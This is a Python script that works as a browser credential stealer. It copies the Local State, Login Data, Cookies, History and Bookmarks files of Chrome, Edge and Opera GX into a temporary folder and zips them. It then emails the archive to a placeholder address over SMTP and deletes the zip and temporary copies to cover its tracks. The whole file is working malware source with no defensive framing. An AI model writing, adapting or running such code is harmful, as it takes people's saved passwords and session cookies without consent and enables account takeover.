import os
import shutil
import SMTP.smtp_server as server

def main():
    BasePath = os.getenv('localappdata')

    TARGET_FILE_PATH = {
        "CHROME_LOCAL_STATE_FILE_PATH": BasePath + \
                                        '\\Google\\Chrome\\User Data\\Local State',
        "CHROME_PASSWORDS_DB_PATH": BasePath + \
                                    '\\Google\\Chrome\\User Data\\Default\\Login Data',
        "CHROME_COOKIES_DB_PATH": BasePath + \
                                  '\\Google\\Chrome\\User Data\\Default\\Cookies',
        "CHROME_HISTORY_DB_PATH": BasePath + \
                                  '\\Google\\Chrome\\User Data\\Default\\History',
        "CHROME_BOOKMARKS_FILE_PATH": BasePath + \
                                      '\\Google\\Chrome\\User Data\\Default\\Bookmarks',
        "EDGE_LOCAL_STATE_FILE_PATH": BasePath + \
                                      '\\Microsoft\\Edge\\User Data\\Local State',
        "EDGE_PASSWORDS_DB_PATH": BasePath + \
                                  '\\Microsoft\\Edge\\User Data\\Default\\Login Data',
        "EDGE_COOKIES_DB_PATH": BasePath + \
                                '\\Microsoft\\Edge\\User Data\\Default\\Cookies',
        "EDGE_HISTORY_DB_PATH": BasePath + \
                                '\\Microsoft\\Edge\\User Data\\Default\\History',
        "EDGE_BOOKMARKS_FILE_PATH": BasePath + \
                                    '\\Microsoft\\Edge\\User Data\\Default\\Bookmarks',
        "OPERAGX_LOCAL_STATE_FILE_PATH": BasePath + \
                                         '\\..\\Roaming\\Opera Software\\Opera GX Stable\\Local State',
        "OPERAGX_PASSWORDS_DB_PATH": BasePath + \
                                     '\\..\\Roaming\\Opera Software\\Opera GX Stable\\Login Data',
        "OPERAGX_COOKIES_DB_PATH": BasePath + \
                                   '\\..\\Roaming\\Opera Software\\Opera GX Stable\\Cookies',
        "OPERAGX_HISTORY_DB_PATH": BasePath + \
                                   '\\..\\Roaming\\Opera Software\\Opera GX Stable\\History',
        "OPERAGX_BOOKMARKS_FILE_PATH": BasePath + \
                                       '\\..\\Roaming\\Opera Software\\Opera GX Stable\\Bookmarks'
    }

    COPY_PATH = {
        "CHROME_LOCAL_STATE_FILE_PATH": BasePath + \
                                        '\\Temp\\Copy\\Chrome_Local_State',
        "CHROME_PASSWORDS_DB_PATH": BasePath + \
                                    '\\Temp\\Copy\\Chrome_Login_Data',
        "CHROME_COOKIES_DB_PATH": BasePath + \
                                  '\\Temp\\Copy\\Chrome_Cookies',
        "CHROME_HISTORY_DB_PATH": BasePath + \
                                  '\\Temp\\Copy\\Chrome_History',
        "CHROME_BOOKMARKS_FILE_PATH": BasePath + \
                                      '\\Temp\\Copy\\Chrome_Bookmarks',
        "EDGE_LOCAL_STATE_FILE_PATH": BasePath + \
                                      '\\Temp\\Copy\\Edge_Local_State',
        "EDGE_PASSWORDS_DB_PATH": BasePath + \
                                  '\\Temp\\Copy\\Edge_Login_Data',
        "EDGE_COOKIES_DB_PATH": BasePath + \
                                '\\Temp\\Copy\\Edge_Cookies',
        "EDGE_HISTORY_DB_PATH": BasePath + \
                                '\\Temp\\Copy\\Edge_History',
        "EDGE_BOOKMARKS_FILE_PATH": BasePath + \
                                    '\\Temp\\Copy\\Edge_Bookmarks',
        "OPERAGX_LOCAL_STATE_FILE_PATH": BasePath + \
                                         '\\Temp\\Copy\\OPERAGX_Local_State',
        "OPERAGX_PASSWORDS_DB_PATH": BasePath + \
                                     '\\Temp\\Copy\\OPERAGX_Login_Data',
        "OPERAGX_COOKIES_DB_PATH": BasePath + \
                                   '\\Temp\\Copy\\OPERAGX_Cookies',
        "OPERAGX_HISTORY_DB_PATH": BasePath + \
                                   '\\Temp\\Copy\\OPERAGX_History',
        "OPERAGX_BOOKMARKS_FILE_PATH": BasePath + \
                                       '\\Temp\\Copy\\OPERAGX_Bookmarks',
    }

    if not os.path.exists(BasePath + "/Temp/Copy/"):
        os.makedirs(BasePath + "/Temp/Copy/")

    for target in TARGET_FILE_PATH:
        if os.path.exists(TARGET_FILE_PATH[target]):
            shutil.copy2(TARGET_FILE_PATH[target], COPY_PATH[target])

    file = os.getenv("APPDATA") + r'/../../Desktop/Data123963.zip'
    file = file.replace("/", "\\")
    shutil.make_archive(BasePath + "/../../Desktop/Data123963", "zip", BasePath + "/Temp/Copy/")
    # Limpieza de pruebas
    shutil.rmtree(BasePath + "/Temp/Copy/")
    # Envio
    server.sendMail(['xxx@xxx.com'], "zipp", "zippp", [file])
    # Limpieza de pruebas
    os.remove(file)


if __name__ == "__main__":
    main()